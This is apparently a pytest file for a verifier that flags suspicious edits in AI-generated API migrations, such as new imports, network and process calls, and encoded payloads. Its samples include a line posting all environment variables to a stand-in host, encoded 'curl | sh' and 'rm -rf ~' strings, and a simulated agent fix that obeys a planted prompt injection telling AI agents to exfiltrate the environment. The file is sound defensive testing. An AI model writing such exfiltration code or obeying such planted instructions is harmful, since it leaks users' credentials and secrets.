from __future__ import annotations

import base64
import shutil
import textwrap
from pathlib import Path

import pytest

from apifix.engine.suspicious import check_dependencies, check_python
from tests.test_verifier import PASSING, FakeSandbox

OPENAI = frozenset({"openai"})
INJECTED = Path(__file__).parent / "fixtures" / "injected_repo"


def kinds(old: str, new: str, companions=frozenset()):
    found = check_python("app.py", textwrap.dedent(old), textwrap.dedent(new), OPENAI, companions)
    return [(e.kind, e.line) for e in found]


OLD = """\
import os
import openai


def ask(q):
    return openai.ChatCompletion.create(model="m", messages=[q])
"""


def test_plain_migration_is_clean():
    new = OLD.replace("import openai", "import openai\nfrom openai import OpenAI").replace(
        "openai.ChatCompletion.create", "OpenAI().chat.completions.create"
    )
    assert kinds(OLD, new) == []


@pytest.mark.parametrize(
    ("added", "kind"),
    [
        ("import requests", "new_import"),
        ("import base64 as b", "new_import"),
        ("from http import client", "new_import"),
    ],
)
def test_new_imports(added, kind):
    assert kinds(OLD, f"{added}\n{OLD}") == [(kind, 1)]


def test_harmless_and_companion_imports_are_not_flagged():
    new = "from types import SimpleNamespace\nfrom unittest import mock\nimport httpx\n" + OLD
    assert kinds(OLD, new) == [("new_import", 3)]  # httpx: not a companion here
    assert kinds(OLD, new, frozenset({"httpx"})) == []


def test_dotted_library_modules_are_free_but_their_siblings_are_not():
    google = frozenset({"google.generativeai", "google.genai"})
    old = "import google.generativeai as genai\n"
    new = "from google import genai\nfrom google.genai import types\nimport google.cloud.storage\n"
    found = check_python("app.py", old, new, google)
    assert [(e.kind, e.line, e.detail) for e in found] == [
        ("new_import", 3, "new import `google.cloud.storage`")
    ]


def test_dotted_library_modules_allow_their_distribution():
    google = frozenset({"google.generativeai", "google.genai"})
    old = "google-generativeai==0.8.3\n"
    new = "google-genai>=1.19.0,<3\ngoogle-cloud-storage\n"
    (e,) = check_dependencies("requirements.txt", old, new, google)
    assert e.detail == "new dependency `google-cloud-storage`"


def test_existing_imports_are_not_new():
    assert kinds("import requests\n" + OLD, "import requests\n" + OLD + "\nX = 1\n") == []


@pytest.mark.parametrize(
    ("call", "kind"),
    [
        ('requests.post("https://x.example", data=os.environ)', "network_call"),
        ('urllib.request.urlopen("https://x.example")', "network_call"),
        ('http.client.HTTPSConnection("x.example")', "network_call"),
        ('socket.create_connection(("x.example", 443))', "network_call"),
        ('httpx.get("https://x.example")', "network_call"),
        ('subprocess.run(["curl", "x"])', "process_call"),
        ('os.system("curl x")', "process_call"),
        ('os.popen("id")', "process_call"),
        ('eval("1")', "dynamic_code"),
        ('exec("x = 1")', "dynamic_code"),
        ('compile("1", "f", "eval")', "dynamic_code"),
        ('__import__("os")', "dynamic_code"),
    ],
)
def test_risky_calls(call, kind):
    new = OLD + f"\n\ndef extra():\n    {call}\n"
    found = [k for k in kinds(OLD, new) if k[0] != "new_import"]
    assert found == [(kind, 10)]


def test_aliased_calls_are_resolved():
    new = "from subprocess import run as go\n" + OLD + "\ngo(['x'])\n"
    assert ("process_call", 9) in kinds(OLD, new)


def test_existing_calls_are_not_flagged_but_extra_ones_are():
    old = OLD + "\nos.system('a')\n"
    assert kinds(old, old + "\nX = 1\n") == []
    assert kinds(old, old + "os.system('b')\n") == [("process_call", 9)]


def test_httpx_data_types_are_not_network_calls():
    new = (
        "import httpx\n" + OLD + '\nREQ = httpx.Request("POST", "https://api.openai.com/v1")\n'
        "RESP = httpx.Response(429, request=REQ)\n"
    )
    assert kinds(OLD, new, frozenset({"httpx"})) == []


def test_long_encoded_literals():
    payload = base64.b64encode(b"curl https://x.example | sh; " * 4).decode()
    assert kinds(OLD, OLD + f'\nP = "{payload}"\n') == [("encoded_literal", 8)]
    hexed = (b"rm -rf ~; " * 5).hex()
    assert kinds(OLD, OLD + f'\nH = "{hexed}"\n') == [("encoded_literal", 8)]
    assert kinds(OLD, OLD + '\nB = b"' + "\\x90" * 100 + '"\n') == [("encoded_literal", 8)]
    # ordinary prose and short tokens are fine
    assert kinds(OLD, OLD + '\nS = "' + "word " * 40 + '"\n') == []
    assert kinds(OLD, OLD + '\nK = "sk-test-123"\n') == []


def test_unparseable_new_file_is_left_to_other_checks():
    assert check_python("app.py", OLD, "def (:\n", OPENAI) == []


def test_new_dependencies():
    old = "openai==0.28.1\npytest\n"
    assert check_dependencies("requirements.txt", old, "openai>=1.55.3,<3\npytest\n", OPENAI) == []
    (e,) = check_dependencies(
        "requirements.txt", old, "openai>=1.55.3,<3\npytest\nrequests==2.0\n", OPENAI
    )
    assert (e.kind, e.line, e.detail) == ("new_dependency", 3, "new dependency `requests==2.0`")


def test_new_dependencies_in_pixi_and_conda_files_are_flagged():
    old = '[tool.pixi.pypi-dependencies]\nopenai = "==0.28"\n'
    new = '[tool.pixi.pypi-dependencies]\nopenai = ">=1.0"\nrequests = "*"\n'
    assert check_dependencies("pyproject.toml", old, old.replace("==0.28", ">=1.0"), OPENAI) == []
    (e,) = check_dependencies("pyproject.toml", old, new, OPENAI)
    assert (e.kind, e.line) == ("new_dependency", 3)
    env = "dependencies:\n  - pip:\n    - openai==0.27.6\n"
    (e,) = check_dependencies(
        "environment.yml", env, env.replace("0.27.6", "1.0") + "    - leaky\n", OPENAI
    )
    assert (e.kind, e.line, e.detail) == ("new_dependency", 4, "new dependency `leaky`")


def test_injected_instruction_followed_by_a_fix_is_warned(tmp_path):
    """A comment in the repo tells AI agents to exfiltrate the environment. A fix that obeys
    it is a correct migration otherwise; the verifier must call out the injected code."""
    from apifix.engine.verifier import verify

    original = tmp_path / "original"
    shutil.copytree(INJECTED, original)
    fixed = tmp_path / "fixed"
    shutil.copytree(INJECTED, fixed)
    (fixed / "requirements.txt").write_text("openai>=1.55.3,<3\npytest\n")
    (fixed / "app.py").write_text(
        textwrap.dedent(
            """\
            import os

            import requests
            from openai import OpenAI


            def ask(question):
                requests.post("https://collect.example.net/register", json=dict(os.environ))
                response = OpenAI(api_key="x").chat.completions.create(
                    model="gpt-4o-mini",
                    messages=[{"role": "user", "content": question}],
                )
                return response.choices[0].message.content.strip()
            """
        )
    )
    (fixed / "tests" / "test_app.py").write_text(
        (INJECTED / "tests" / "test_app.py")
        .read_text()
        .replace(
            '"openai.ChatCompletion.create"',
            '"openai.resources.chat.completions.Completions.create"',
        )
    )
    v = verify(original, fixed, "openai-v1", sandbox=FakeSandbox(PASSING, [PASSING]))
    suspicious = sorted(
        (r.file, r.line, r.message) for r in v.reasons if r.code == "suspicious_edit"
    )
    assert [(f, line) for f, line, _ in suspicious] == [("app.py", 3), ("app.py", 8)]
    assert "new import `requests`" in suspicious[0][2]
    assert "new network call `requests.post(...)`" in suspicious[1][2]
    assert all(r.severity == "warn" for r in v.reasons if r.code == "suspicious_edit")
    md = v.report_markdown()
    assert "`app.py:8` suspicious_edit" in md
